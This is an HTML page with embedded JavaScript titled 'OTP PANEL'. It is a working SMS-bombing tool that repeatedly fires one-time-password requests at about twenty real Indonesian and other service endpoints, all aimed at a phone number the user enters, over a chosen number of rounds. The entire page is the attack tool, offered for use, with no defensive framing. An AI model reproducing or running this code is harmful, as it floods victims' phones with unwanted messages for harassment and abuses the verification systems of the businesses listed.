<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>OTP PANEL</title>
<style>
body{background:#05060a;color:#c9d1e0;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}
.box{background:#0b0e16;padding:28px;border-radius:18px;width:460px;border:1px solid #1a2236;box-shadow:0 0 40px rgba(0,229,255,.08)}
h2{margin:0 0 20px;text-align:center;background:linear-gradient(90deg,#00e5ff,#ff2d95);-webkit-background-clip:text;color:transparent;letter-spacing:3px;font-size:16px}
input,button{width:100%;padding:13px;margin:6px 0;border-radius:11px;border:1px solid #1c2436;background:#070a12;color:#c9d1e0;font-family:monospace;font-size:14px;box-sizing:border-box;outline:none}
input:focus{border-color:#00e5ff}
button{background:linear-gradient(90deg,#00e5ff,#ff2d95);color:#02121a;font-weight:bold;border:none;cursor:pointer;letter-spacing:2px}
button:disabled{opacity:.4}
#log{margin-top:12px;font-size:11px;height:220px;overflow-y:auto;background:#04060a;border-radius:10px;padding:10px;color:#666;white-space:pre-wrap}
.ok{color:#00ff9d}.err{color:#ff3b5c}.info{color:#00e5ff}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:12px}
.stat{background:#070a12;border:1px solid #141b2c;border-radius:8px;padding:8px;text-align:center;font-size:10px;color:#5a6478}
.stat b{display:block;font-size:16px;color:#00e5ff}
</style></head>
<body>
<div class="box">
<h2>◤ OTP PANEL ◢</h2>
<input id="p" placeholder="+628xxxxxxxxxx">
<input id="r" type="number" value="3" placeholder="rounds">
<button id="b">⚡ ACTIVATE</button>
<div class="stats">
  <div class="stat"><b id="s1">0</b>FIRED</div>
  <div class="stat"><b id="s2">0</b>OK</div>
  <div class="stat"><b id="s3">0</b>FAIL</div>
</div>
<div id="log"></div>
</div>
<script>
const $=id=>document.getElementById(id);
let f=0,o=0,e=0;
function log(m,c='info'){const d=document.createElement('div');d.className=c;d.textContent='['+new Date().toLocaleTimeString()+'] '+m;$('log').appendChild(d);$('log').scrollTop=1e9;}

// REAL Indonesian OTP endpoints extracted from MySPAMBot-OTP
const APIS = [
  {n:'ThaiFriendly', method:'POST', url:'https://www.thaifriendly.com/pl/index.php', body:'z=phonelogingetpin&country=62&number={phone}&ppclienttoken=igq39qdc9rwk2ax1zrgdq'},
  {n:'Klikdok', method:'POST', url:'https://nuubi.herokuapp.com/api/spam/klikdok', body:'number={phone}'},
  {n:'Trimegah', method:'POST', url:'https://sbn.trimegah.id/agent/register/sendOtp', body:'noHp={phone}&email=yvtix@zx.id'},
  {n:'Payfazz', method:'POST', url:'https://api.payfazz.com/v2/phoneVerifications', body:'phone=0{phone}'},
  {n:'Tri', method:'POST', url:'https://registrasi.tri.co.id/daftar/generateOTP?', body:'msisdn={phone}'},
  {n:'Bocil', method:'POST', url:'https://bocil.id/mobile/v1/miscallotp_request.php', body:'user_id=&language=in&phone=62{phone}&device_id=590bc36d99d6dddb&retry=0'},
  {n:'Battlefront', method:'POST', url:'https://battlefront.danacepat.com/v1/auth/common/phone/send-code', body:'mobile_no={phone}'},
  {n:'Nutriclub', method:'GET', url:'https://www.nutriclub.co.id/otp/?phone=0{phone}&old_phone=0{phone}'},
  {n:'Jagreward', method:'GET', url:'https://id.jagreward.com/member/verify-mobile/{phone}/'},
  {n:'KTBS', method:'GET', url:'https://core.ktbs.io/v2/user/registration/otp/{phone}'},
  {n:'Redbus', method:'GET', url:'https://m.redbus.id/api/getOtp?number={phone}&cc=62&whatsAppOpted=True'},
  {n:'KlikIndomaret', method:'GET', url:'https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={phone}'},
  {n:'Sampingan', method:'POST', url:'https://srv3.sampingan.co.id/auth/generate-otp', body:'{"countryCode":"+62","phoneNumber":"{phone}"}'},
  {n:'GrabFood', method:'POST', url:'https://api-sms-v2.herokuapp.com/grab-food?phone={phone}'},
  {n:'Tiki', method:'POST', url:'https://api-sms-v2.herokuapp.com/tiki?phone={phone}'},
  {n:'Gojoy', method:'POST', url:'https://api-sms-v2.herokuapp.com/gojoy?phone={phone}'},
  {n:'Vntrip', method:'POST', url:'https://api-sms-v2.herokuapp.com/vntrip?phone={phone}'},
  {n:'Thegioididong', method:'POST', url:'https://api-sms-v2.herokuapp.com/the-gioi-di-dong?phone={phone}'},
  {n:'Alodok', method:'POST', url:'https://nuubi.herokuapp.com/api/spam/alodok', body:'number={phone}'},
  {n:'Klikwa', method:'POST', url:'https://api.klikwa.net/v1/number/sendotp', body:'{"number":"+62{phone}"}'},
];

$('b').onclick=async()=>{
  let phone=$('p').value.trim().replace(/^\+?62/,'').replace(/^0/,'');
  if(!phone)return log('enter a number','err');
  const rounds=Math.max(1,parseInt($('r').value)||1);
  $('b').disabled=true;
  f=o=e=0;$('s1').textContent=$('s2').textContent=$('s3').textContent='0';
  log('▶ firing '+APIS.length+' endpoints × '+rounds+' rounds','info');

  for(let r=0;r<rounds;r++){
    for(const api of APIS){
      try{
        const opts={method:api.method, mode:'no-cors'};
        if(api.body){
          opts.headers={'Content-Type':'application/x-www-form-urlencoded'};
          opts.body=api.body.replace(/{phone}/g,phone);
        }
        await fetch(api.url.replace(/{phone}/g,phone), opts);
        f++;o++;$('s1').textContent=f;$('s2').textContent=o;
        log('✓ '+api.n+' sent','ok');
      }catch(err){
        f++;e++;$('s1').textContent=f;$('s3').textContent=e;
        log('✗ '+api.n+' '+err.message,'err');
      }
    }
    log('── round '+(r+1)+'/'+rounds+' ──','info');
    await new Promise(res=>setTimeout(res,600));
  }
  log('■ done','info');
  $('b').disabled=false;
};
</script>
</body>
</html>
